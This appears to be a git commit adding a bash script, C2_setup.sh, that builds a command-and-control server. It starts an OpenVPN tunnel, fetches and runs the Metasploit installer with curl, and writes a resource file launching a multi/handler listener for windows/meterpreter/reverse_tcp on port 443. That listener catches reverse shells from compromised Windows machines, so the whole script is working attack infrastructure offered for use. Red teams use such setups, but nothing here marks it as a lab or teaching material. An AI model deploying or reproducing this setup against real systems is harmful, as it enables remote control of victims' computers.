cb5438d8bb32a29a19c2afcb17e6701b2612160a
Anass Bekar <60917979+Anass-bekar@users.noreply.github.com>
2021-01-15 11:43:19 +0100

    Create C2_setup.sh

---
+++ C2-Server/C2_setup.sh
@@ -0,0 +1,22 @@
+#!/bin/bash
+#update
+apt update
+#install curl and openvpn
+apt install curl -y
+sudo apt install -y openvpn
+sudo apt install -y network-manager-openvpn
+#prepare certs and launch openvpn as a daemon
+chmod 600 /tmp/ssl/*
+openvpn --config /tmp/c2.ovpn --daemon 
+#install python
+sudo apt-get install -y python3
+#install metasploit
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
+chmod +x /tmp/msfinstall
+/tmp/msfinstall
+#Create a ressource file to start your handler quickly upon establishing ssh connection
+echo "use exploit/multi/handler" > /tmp/rcFile.rc
+echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/rcFile.rc
+echo "set LHOST 0.0.0.0" >> /tmp/rcFile.rc
+echo "set LPORT 443" >> /tmp/rcFile.rc
+echo "exploit -j" >> /tmp/rcFile.rc
